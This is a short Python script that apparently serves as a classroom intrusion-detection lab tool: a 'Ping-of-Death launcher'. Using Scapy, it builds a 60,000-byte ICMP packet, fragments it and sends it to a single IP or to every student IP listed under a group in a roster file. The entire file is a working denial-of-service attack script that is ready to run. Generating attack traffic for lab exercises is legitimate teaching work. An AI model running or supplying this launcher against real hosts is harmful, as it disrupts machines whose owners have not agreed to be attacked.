import json
import argparse
import os
from scapy.all import *
import time

PAYLOAD = "X" * 60000   # oversized payload


def load_roster(path):
    with open(path) as f:
        return json.load(f)


def send_pod(ip):
    print(f"Attacking {ip}")
    pkt = IP(dst=ip)/ICMP()/PAYLOAD
    frags = fragment(pkt, fragsize=1480)
    send(frags, verbose=False)
    time.sleep(0.5)


def attack_group(group_name, roster):
    if group_name not in roster:
        print(f"Group '{group_name}' not found")
        return

    group = roster[group_name]
    for student, ip in group.items():
        print(f"{student} -> {ip}")
        send_pod(ip)


def main():
    parser = argparse.ArgumentParser(description="Simple Ping-of-Death launcher")

    parser.add_argument("--roster", default=None,
                        help="Roster JSON file (optional; needed for --target-group)."
                             " If omitted, will look for ids_sec3_students.json next to script.")

    parser.add_argument("--target-group", help="Group name (e.g., group1)")
    parser.add_argument("--target-ip", help="Single IP (e.g., 192.168.2.26)")
    args = parser.parse_args()

    roster = {}
    if args.roster:
        roster_path = args.roster
    else:
        script_dir = os.path.dirname(os.path.realpath(__file__))
        roster_path = os.path.join(script_dir, 'ids_sec3_students.json')

    if args.target_ip:
        send_pod(args.target_ip)

    if args.target_group:
        if not os.path.exists(roster_path):
            print("Roster file required when using --target-group (", roster_path, ")")
            return
        roster = load_roster(roster_path)
        attack_group(args.target_group, roster)

    if not args.target_ip and not args.target_group:
        print("Use --target-group <name> or --target-ip <ip>")


if __name__ == "__main__":
    main()
